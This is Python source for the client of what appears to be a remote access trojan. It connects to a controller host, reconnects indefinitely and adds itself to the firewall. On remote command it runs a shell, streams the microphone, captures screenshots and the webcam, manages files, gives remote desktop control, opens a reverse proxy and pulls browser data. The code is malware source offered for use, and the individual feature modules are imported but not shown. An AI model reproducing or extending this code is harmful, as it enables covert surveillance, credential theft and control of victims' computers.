import socketio
from .plugins.info import ClientInfo
from .plugins.converter import Converter
import time
from .plugins.shell import ShellHandler
import threading
from .plugins.shared import SharedData
from .features.terminal import terminal
from .features.microphone import start_audio_stream
from .features.screenshot import send_screenshot
from .features.webcam import send_webcam
from .features.filemanager import file_manager
from .plugins.fm import FileManager
import uuid
from .features.remotedesktop import send_frame, perform_action
from .features.proxy import start_reverseproxy
from .features.browser import retrieve_browser_data
from .features.client import ClientCenter
from .features.power import PowerCenter
import zlib
from .plugins.firewall import add_to_firewall

lock = threading.Lock()

class Client:
    def __init__(self, host, port):
        self.sio = socketio.Client(reconnection=True, reconnection_attempts=0, reconnection_delay=1)
        self.client_info = ClientInfo()
        self.client_details = self.client_info.get_details()
        self.converter = Converter()
        self.host = host
        self.port = port
        self.shell_handler = ShellHandler()
        self.audio_handler = None
        self.file_manager = None
        self.shared_data = SharedData()
        self.fm = FileManager(self)
        self.connected = None
        self.remotedesktop = None
        self.reverseproxy = None

        self.sio.on('connect', self.connect)
        self.sio.on('disconnect', self.disconnect)
        self.sio.on('response', self.response)
        self.sio.on('received_response', self.received_response)

        self.connect_with_retry()

    def wait_for_ack(self, key):
        start_time = time.time()
        while time.time() - start_time < 180:
            shared_data = self.shared_data.get_shared_data(key)
            if shared_data:
                return True
            time.sleep(0.05)
        return False

    def compress_message(self, message):
        return zlib.compress(message.encode('utf-8'))

    def send_message(self, key, message):
        try:
            with lock:
                message_identifier = str(uuid.uuid4())
                compressed_message = self.compress_message(message)
                self.sio.emit(key, {message_identifier: compressed_message})
            return self.wait_for_ack(message_identifier)
        except Exception as e:
            return False

    def connect(self):
        self.connected = True
        client_info = {"new_client": self.client_details}
        self.send_message("new_client", self.converter.encode(client_info))

    def disconnect(self):
        self.remotedesktop = False
        self.connected = False
        self.audio_handler = False
        self.reverseproxy = False

    def received_response(self, data):
        message = self.converter.decode(data)
        key = next(iter(message))
        self.shared_data.set_data(key, key)

    def response(self, data):
        message = self.converter.decode(data)

        if message.get("terminal"):
            threading.Thread(target=terminal, args=(self, message), daemon=True).start()

        elif (audiostream := message.get("audiostream")) is not None:
            if audiostream is True:
                if not self.audio_handler:
                    self.audio_handler = True
                    threading.Thread(target=start_audio_stream, args=(self,), daemon=True).start()
            else:
                self.audio_handler = False

        elif message.get("screenshot"):
            threading.Thread(target=send_screenshot, args=(self,), daemon=True).start()

        elif message.get("webcam"):
            threading.Thread(target=send_webcam, args=(self,), daemon=True).start()

        elif message.get("filemanager"):
            threading.Thread(target=file_manager, args=(self, message), daemon=True).start()

        elif (remotedesktop := message.get("remotedesktop")) is not None:
            if remotedesktop is True:
                if not self.remotedesktop:
                    self.remotedesktop = True
                    threading.Thread(target=send_frame, args=(self,), daemon=True).start()
                    threading.Thread(target=perform_action, args=(self,), daemon=True).start()
                self.shared_data.set_data("remotedesktop", message)
            else:
                self.remotedesktop = False
                
        elif (reverseproxy := message.get("reverseproxy")) is not None:
            if reverseproxy is True:
                if not self.reverseproxy:
                    self.reverseproxy = True
                    threading.Thread(target=start_reverseproxy, args=(self, message), daemon=True).start()
            else:
                self.reverseproxy = False
        
        elif message.get("browser"):
            threading.Thread(target=retrieve_browser_data, args=(self,), daemon=True).start()

        elif message.get("client"):
            threading.Thread(target=ClientCenter, args=(message,), daemon=True).start()

        elif message.get("power"):
            threading.Thread(target=PowerCenter, args=(message,), daemon=True).start()

    def connect_with_retry(self, delay=5):
        while True:
            try:
                self.sio.connect(f'http://{self.host}:{self.port}', transports=['websocket'])
                break
            except socketio.exceptions.ConnectionError:
                pass
            except Exception:
                pass
            time.sleep(delay)
        self.sio.wait()

def start_listener(HOST, PORT):
    add_to_firewall()
    Client(HOST, PORT)